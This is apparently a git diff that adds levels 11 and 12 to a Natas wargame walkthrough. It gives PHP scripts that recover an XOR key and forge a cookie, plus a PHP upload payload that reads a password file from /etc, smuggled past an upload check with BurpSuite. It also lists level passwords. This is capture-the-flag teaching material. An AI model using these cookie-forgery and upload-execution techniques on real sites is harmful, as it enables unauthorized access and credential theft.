@@ -148,3 +148,110 @@ Here's your solution.
 
 > Here's your password: U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
 
+
+### Level 11
+When we first see the level, it tell us everything, we need to decrypt something and work with cookie
+
+In the textbox we can change the background color of the page, useless for now.
+
+Open the cookie with whatever you want (I'll use cookie manager from firefox plugin), now take the content of the cookie we need to decode the `%3D` in something understandable, so we will use [hackvector.com](https://hackvertor.co.uk/public#) to decode from url encode.
+
+Now we have the base64 version of the string `”showpassword”=>”no”, “bgcolor”=>”#ffffff”);`, so knowing a bit of cryptography se also know that with plaintext and ciphertext we can extrapolate the key:
+
+```PHP
+#!/usr/bin/php
+ 
+<? 
+    $cookie = base64_decode('ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw'); 
+    
+    function xor_encrypt($in)
+    { 
+        $text = $in; 
+        $key = json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff"));
+        $outText = '';
+     
+        // Iterate through each character
+     
+        for($i=0;$i<strlen($text);$i++) 
+        { 
+            $outText .= $text[$i] ^ $key[$i % strlen($key)]; 
+        } 
+        
+        return $outText; 
+    } 
+
+    print xor_encrypt($cookie); 
+?>
+```
+
+```
+php natas_11.php
+
+qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq
+```
+
+Now that we have the key, we can create our custom cookie in the way that it will show us the password, and I've done it with this script:
+
+```
+#!/usr/bin/php
+
+<? 
+    function xor_encrypt($in)
+    { 
+        $text = json_encode(array( "showpassword"=>"yes", "bgcolor"=>"#ffffff"));
+        $key = "qw8J";
+        $outText = '';
+
+        // Iterate through each character
+
+        for($i=0;$i<strlen($text);$i++) 
+        { 
+            $outText .= $text[$i] ^ $key[$i % strlen($key)]; 
+        } 
+        return $outText; 
+    } 
+    
+    print base64_encode(xor_encrypt()); 
+?>
+```
+This is our new string:
+```
+php natas_11-2.php
+
+ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK
+```
+
+Now put it in the cookie and you'll get the password
+
+> The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
+
+
+### Level 12
+
+This level is pretty interesting, and a bit tricky because we need to use BurpSuite to intercept our request, but we'll talk about that later.
+
+As we first open the page we see that we can upload a file, and when we see the source code we also see that our uploaded file will have a random string as name with the .jpg format.
+
+So we first have to craft out file, like this:
+
+```PHP
+#!/usr/bin/php
+
+<? readfile('/etc/natas_webpass/natas13'); ?>
+```
+Here is where BurpSuite come in our help (I won't explain how to use it, but is preatty simple and you can learn this thing with a 10 minutes on google)
+
+What we have to do with BurpSuite is change the extension of our uploaded file so we can run it.
+
+```
+The file upload/lrn0t7ehgm.php has been uploaded
+```
+
+Now we just have to open the file and we'll se the password:
+
+> Here's your password for the next level: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
+
+
+### Level 13
+
+Cooming soon.
